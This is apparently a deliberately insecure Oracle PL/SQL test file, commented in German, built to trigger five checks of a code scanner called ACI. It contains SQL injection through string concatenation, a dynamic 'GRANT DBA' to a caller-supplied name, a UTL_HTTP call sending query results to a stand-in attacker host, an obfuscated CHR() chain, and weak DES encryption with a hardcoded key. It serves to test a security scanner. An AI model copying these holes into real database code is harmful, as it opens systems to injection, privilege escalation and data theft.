-- ---------------------------------------------------------------------
-- Beispieldatei für ACI - bewusst unsichere Oracle-Prozedur.
-- Diese Datei dient ausschließlich Demonstrations- und Testzwecken.
-- Sie löst alle fünf ACI-Checks aus.
-- ---------------------------------------------------------------------

CREATE OR REPLACE PROCEDURE get_user_data (
    p_user_name  IN  VARCHAR2,
    number       IN  NUMBER          -- Check 1: 'NUMBER' ist reserviertes Wort
) AS
    l_sql      VARCHAR2(4000);
    l_result   VARCHAR2(4000);
    "SELECT"   VARCHAR2(100);        -- Check 1: gequoteter reservierter Bezeichner
    l_cipher   RAW(2000);
BEGIN
    -- Check 4: SQL Injection - dynamisches SQL per Konkatenation gebildet
    l_sql := 'SELECT data FROM accounts WHERE name = ''' || p_user_name || '''';
    EXECUTE IMMEDIATE l_sql INTO l_result;

    -- Check 4: SQL Injection - direkte Konkatenation einer Variablen
    EXECUTE IMMEDIATE 'SELECT col FROM t WHERE id = ' || number INTO l_result;

    -- Check 5: DDL im Code - dynamisches GRANT (Rechteausweitung)
    EXECUTE IMMEDIATE 'GRANT DBA TO ' || p_user_name;

    -- Check 2: unerwünschte Packages
    l_cipher := DBMS_CRYPTO.ENCRYPT(UTL_RAW.CAST_TO_RAW('geheim'),
                                    DBMS_CRYPTO.DES_CBC_PKCS5,
                                    UTL_RAW.CAST_TO_RAW('schlüssel'));
    UTL_HTTP.REQUEST('http://angreifer.example.com/sammeln?d=' || l_result);

    -- Check 3: verschleierte Zeichenkette (lange CHR()-Kette)
    l_sql := CHR(68) || CHR(82) || CHR(79) || CHR(80) || CHR(32) || CHR(84);

    -- Check 3: Base64-kodierter Block in einem String-Literal
    l_result := 'TG9yZW1JcHN1bURvbG9yU2l0QW1ldENvbnNlY3RldHVyQWRpcGlzY2luZ0VsaXQ=';
END;
/

-- Check 5: eigenständige DDL-Anweisung (GRANT an PUBLIC)
GRANT EXECUTE ON get_user_data TO PUBLIC;
